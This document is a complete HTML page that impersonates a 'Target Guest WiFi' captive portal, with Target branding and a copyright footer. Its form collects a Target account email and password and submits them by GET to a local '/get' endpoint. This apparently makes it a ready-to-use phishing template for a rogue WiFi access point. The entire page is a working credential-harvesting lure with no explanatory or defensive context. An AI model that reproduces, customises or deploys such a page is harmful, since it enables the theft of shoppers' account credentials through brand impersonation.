<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#CC0000;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.bull{width:64px;height:64px;margin:0 auto 10px;border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center}
.bull svg{width:44px;height:44px}
.brand{font-size:14px;font-weight:800;color:#fff;text-align:center;letter-spacing:2px;text-transform:uppercase;margin-bottom:24px}
.card{background:#fff;width:100%;max-width:400px;border-radius:16px;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,0.25)}
.ch{background:#CC0000;padding:18px 24px;text-align:center}
.ch h1{font-size:16px;font-weight:800;color:#fff}.ch p{font-size:12px;color:rgba(255,255,255,0.75);margin-top:3px}
.cb{padding:24px}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:15px;background:#fafafa;color:#1a1a1a}
input:focus{outline:none;border-color:#CC0000;box-shadow:0 0 0 3px rgba(204,0,0,0.1)}
input::placeholder{color:#c0c0c0}
.terms{font-size:11px;color:#aaa;text-align:center;margin-top:14px;line-height:1.5}.terms a{color:#CC0000}
.btn{width:100%;padding:13px;border:none;border-radius:10px;background:#CC0000;color:#fff;font-size:14px;font-weight:800;cursor:pointer;margin-top:14px}
.foot{background:#f7f9fb;border-top:1px solid #eee;padding:12px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:11px;color:#aaa}.foot a{color:#CC0000;text-decoration:none}
</style>
</head>
<body>
<div class="bull"><svg viewBox="0 0 44 44"><circle cx="22" cy="22" r="22" fill="#CC0000"/><circle cx="22" cy="22" r="14" fill="#fff"/><circle cx="22" cy="22" r="7" fill="#CC0000"/></svg></div>
<div class="brand">Target Guest WiFi</div>
<div class="card">
  <div class="ch"><h1>Welcome to Target</h1><p>Sign in to access in-store WiFi</p></div>
  <div class="cb">
    <form action="/get">
      <label class="lbl">Target Account Email</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Sign In &amp; Connect</button>
      <p class="terms">By connecting you agree to <a href="#">Target's WiFi Terms</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Target Brands Inc.</span><a href="#">Privacy</a></div>
</div>
</body>
</html>
